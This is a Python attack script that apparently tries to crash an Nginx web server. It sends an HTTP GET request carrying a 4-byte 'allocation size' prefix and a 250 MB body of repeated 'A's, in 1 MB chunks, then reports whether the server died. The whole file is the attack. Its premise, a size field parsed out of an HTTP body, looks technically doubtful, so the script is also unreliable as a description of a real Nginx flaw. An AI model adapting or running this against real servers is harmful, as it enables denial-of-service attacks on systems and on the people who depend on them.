#!/usr/bin/env python3
import socket
import struct
import time

def create_exploit_packet():
    # First 4 bytes: allocation size (4 bytes)
    alloc_size = struct.pack("<I", 4)  # Request tiny allocation
    
    # Create a massive payload (250MB of 'A's)
    payload_size = 250 * 1024 * 1024  # 250MB
    payload = b'A' * payload_size
    
    # Create a valid HTTP request with our payload in the body
    http_request = (
        b"GET / HTTP/1.1\r\n"  # Changed to GET since POST was getting rejected
        b"Host: localhost\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: %d\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    ) % (len(alloc_size) + len(payload))
    
    print(f"[*] Total payload size: {payload_size / (1024*1024):.2f} MB")
    print(f"[*] Requested allocation size: 4 bytes")
    
    # Combine HTTP request with our payload
    return http_request + alloc_size + payload

def main():
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)  # Increased timeout for large payload
    
    try:
        # Connect to Nginx
        print("[*] Connecting to Nginx...")
        s.connect(('localhost', 80))
        
        # Create exploit packet
        print("[*] Creating exploit packet...")
        exploit = create_exploit_packet()
        
        # Send the exploit in chunks to avoid memory issues
        print("[*] Sending exploit packet in chunks...")
        chunk_size = 1024 * 1024  # 1MB chunks
        sent = 0
        while sent < len(exploit):
            chunk = exploit[sent:sent + chunk_size]
            s.send(chunk)
            sent += len(chunk)
            print(f"[*] Sent {sent / (1024*1024):.2f} MB")
        
        # Wait for response
        print("[*] Waiting for response...")
        time.sleep(2)
        
        # Try to receive response
        try:
            response = s.recv(1024)
            print(f"[*] Received response: {response}")
        except socket.timeout:
            print("[*] No response received (server might have crashed)")
        except ConnectionResetError:
            print("[*] Connection reset by peer (server likely crashed)")
            
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main() 